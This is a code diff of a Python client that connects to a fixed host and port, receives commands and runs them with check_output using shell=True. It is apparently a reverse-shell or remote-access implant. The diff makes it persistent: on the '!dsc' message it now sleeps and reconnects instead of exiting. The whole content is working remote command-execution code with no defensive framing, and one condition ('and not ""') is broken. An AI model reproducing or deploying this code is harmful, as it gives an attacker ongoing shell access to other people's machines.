@@ -12,11 +12,13 @@ BUFFER = 1024
 FORMAT = "cp850"
 ADDR = (HOST, PORT)
 
-client = s.socket(s.AF_INET, s.SOCK_STREAM)
+global client
 
 
 def connector():
     try:
+        global client
+        client = s.socket(s.AF_INET, s.SOCK_STREAM)
         client.connect(ADDR)
         recvMsg()
     except ConnectionRefusedError:
@@ -39,6 +41,7 @@ def process(message):
         mode = messageLst[1]
         messageLst.pop(0)
         messageLst.pop(0)
+
         def comm():
             return check_output(messageLst, shell=True).decode(FORMAT)
 
@@ -78,18 +81,17 @@ def process(message):
     else:
         if message == "!dsc":
             client.close()
-            exit()
+            sleep(30)
+            connector()
 
 
 def recvMsg():
-    try:
-        msgLen = int(client.recv(BUFFER).decode(FORMAT))
+    msgLen = client.recv(BUFFER).decode(FORMAT)
 
-        if msgLen:
-            msg = client.recv(int(msgLen)).decode(FORMAT)
-            process(msg)
-    except ConnectionResetError:
-        connector()
+    if msgLen and not "":
+        msgLen = int(msgLen)
+        msg = client.recv(int(msgLen)).decode(FORMAT)
+        process(msg)
 
 
 connector()
